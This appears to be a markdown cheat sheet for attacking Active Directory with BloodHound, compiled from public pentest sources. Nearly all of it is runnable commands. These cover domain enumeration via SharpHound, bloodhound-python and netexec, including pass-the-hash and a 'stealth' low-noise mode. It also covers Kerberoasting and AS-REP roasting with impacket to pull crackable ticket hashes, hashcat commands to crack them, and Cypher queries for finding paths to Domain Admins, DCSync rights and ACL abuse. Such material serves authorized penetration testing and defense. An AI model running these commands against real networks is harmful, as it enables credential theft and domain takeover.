# BloodHound Active Directory Reference

> 来源: BloodHound Wiki, HackTricks AD Methodology, ired.team, SpecterOps "BloodHound Attack Paths"

## Collection Methods

### BloodHound.py (Linux Collector)

```bash
# Full collection with plaintext credentials
bloodhound-python -c All -u 'username' -p 'password' -d 'domain.local' -dc '10.0.0.10' -ns '10.0.0.10'

# Collection with NTLM hash (pass-the-hash)
bloodhound-python -c All -u 'username' --hashes ':aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' -d 'domain.local' -dc '10.0.0.10' -ns '10.0.0.10'

# Specific collection methods
bloodhound-python -c Group,Session,Trusts,ACL,ObjectProps,DCOM,Container -u 'user' -p 'pass' -d 'domain' -dc '10.0.0.10' -ns '10.0.0.10'

# Collection with kerberos ticket (ccache)
export KRB5CCNAME=user.ccache
bloodhound-python -c All -u 'username' -d 'domain.local' -dc '10.0.0.10' -ns '10.0.0.10' -k
```

### SharpHound.exe (Windows Collector)

```powershell
# Full collection
SharpHound.exe -c All

# Specific collection with output directory
SharpHound.exe -c Session,LoggedOn,Group,ACL --OutputDirectory C:\temp\bloodhound

# Stealth collection (single thread, low noise)
SharpHound.exe -c All --Throttle 1000 --Jitter 30 --Stealth

# Loop collection (continuous monitoring for sessions)
SharpHound.exe -c SessionLoop --Loopduration 05:00:00
```

### netexec: Anonymous LDAP BloodHound

```bash
# Anonymous LDAP enumeration with BloodHound collection
netexec ldap 10.0.0.10 -u '' -p '' --bloodhound -c All

# Authenticated LDAP BloodHound
netexec ldap 10.0.0.10 -u 'user' -p 'pass' --bloodhound -c All

# Specific collection type
netexec ldap 10.0.0.10 -u 'user' -p 'pass' --bloodhound -c Group,User,Computer,Container
```

Collection types: `All`, `Group`, `User`, `Computer`, `Container`, `ACL`, `Session`, `Trusts`, `ObjectProps`, `DCOM`, `PSRemote`, `RDP`, `SQLAdmin`, `LoggedOn`

## Kerberoasting

### Enumerate Kerberoastable Users
```bash
impacket-GetUserSPNs 'domain.local/username:password' -dc-ip 10.0.0.10
```

### Request TGS Tickets (Crackable)
```bash
impacket-GetUserSPNs 'domain.local/username:password' -dc-ip 10.0.0.10 -request -outputfile kerberoast_hashes.txt
```

### Crack with hashcat
```bash
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
```
- Mode 13100: Kerberos 5 TGS-REP etype 23 (RC4-HMAC)

### Targeted Kerberoasting
```bash
impacket-GetUserSPNs 'domain.local/username:password' -dc-ip 10.0.0.10 -request -request-user 'sql_svc'
```

### Kerberoasting with netexec
```bash
netexec ldap 10.0.0.10 -u 'user' -p 'pass' --kerberoasting kerberoast_hashes.txt
```

## AS-REP Roasting

### Enumerate AS-REP Roastable Users
```bash
impacket-GetNPUsers 'domain.local/' -dc-ip 10.0.0.10 -usersfile users.txt -format hashcat
```

### No user list (try common usernames)
```bash
impacket-GetNPUsers 'domain.local/' -dc-ip 10.0.0.10 -no-pass -format hashcat
```

### Crack
```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```
- Mode 18200: Kerberos 5 AS-REP etype 23

## Attack Path Analysis

### Key Attack Vectors

#### 1. Shortest Path to Domain Admins
The most common query. Shows the shortest path from any node to the Domain Admins group.
```cypher
MATCH p=shortestPath((n)-[*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'}))
WHERE n.objectid IS NOT NULL
RETURN p
```

#### 2. Kerberoastable Users
Users with SPNs that can be Kerberoasted.
```cypher
MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames
```

#### 3. AS-REP Roastable Users
Users with DONT_REQ_PREAUTH flag set.
```cypher
MATCH (u:User {dontreqpreauth:true}) RETURN u.name
```

#### 4. Unconstrained Delegation
Systems that can impersonate any user.
```cypher
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name
```

#### 5. Constrained Delegation
Service accounts with constrained delegation — can impersonate users to specific services.
```cypher
MATCH (u:User)-[:AllowedToDelegate]->(c:Computer) RETURN u.name, c.name
```

#### 6. DCSync Rights
Principals with GetChanges/GetChangesAll rights — can execute DCSync.
```cypher
MATCH (n)-[:GetChangesAll]->(d:Domain) RETURN n.name
MATCH (n)-[:GetChanges]->(d:Domain) RETURN n.name
```

#### 7. Session Collection (Admin Access)
Logged-on sessions revealing where administrators are currently active.
```cypher
MATCH (n:Computer)-[:HasSession]->(u:User) WHERE u.admincount=true RETURN n.name, u.name
```

#### 8. SQL Admin Paths
Users with SQL admin rights on database servers.
```cypher
MATCH p=(u:User)-[:SQLAdmin]->(c:Computer) RETURN p
```

#### 9. ACL Abuse Paths
GenericAll, GenericWrite, WriteOwner, WriteDACL — all grant object control.
```cypher
MATCH p=(u)-[{isacl:true, isinherited:false}]->(t) WHERE u.name =~ '(?i)TARGET_USER' RETURN p
```

#### 10. Owns / WriteDacl Rights
```cypher
MATCH (u)-[:Owns|:WriteDacl|:GenericAll|:GenericWrite|:WriteOwner]->(c) RETURN u.name, labels(u), c.name, labels(c)
```

## BloodHound CE / Legacy

### Neo4j Setup
```bash
# BloodHound CE (Community Edition) — Docker-based
curl -L https://ghst.ly/get-bhce | docker compose -f - up

# Legacy BloodHound
sudo neo4j console &
bloodhound
```

### Ingest Data
```bash
# bloodhound-cli (legacy)
bloodhound-cli --username neo4j --password bloodhound --zip collected_data.zip

# BloodHound CE — upload zip via web UI

# Alternative: drag-and-drop zip into BloodHound GUI
```

## Pre-Built Custom Queries

### High-Value Targets
```cypher
// Domain Controllers
MATCH (c:Computer) WHERE c.primarygroupid = 516 RETURN c.name
// Domain Admins
MATCH (g:Group) WHERE g.admincount = true RETURN g.name
// Exchange Windows Permissions
MATCH p=shortestPath((g:Group {name:'EXCHANGE WINDOWS PERMISSIONS@DOMAIN.LOCAL'})-[*1..]->(x)) RETURN p
```

## 参考来源

- BloodHound CE Documentation: https://github.com/SpecterOps/BloodHound
- BloodHound Legacy Wiki: https://bloodhound.readthedocs.io/
- HackTricks AD Methodology: https://hacktricks.wiki/en/windows-hardening/active-directory-methodology
- ired.team: "Kerberoasting" — https://www.ired.team/offensive-security/credential-access-and-credential-dumping/kerberoasting
- ired.team: "AS-REP Roasting" — https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat
- SpecterOps: "BloodHound Attack Paths" — https://posts.specterops.io/bloodhound-attack-paths-101-8b96ed04152e
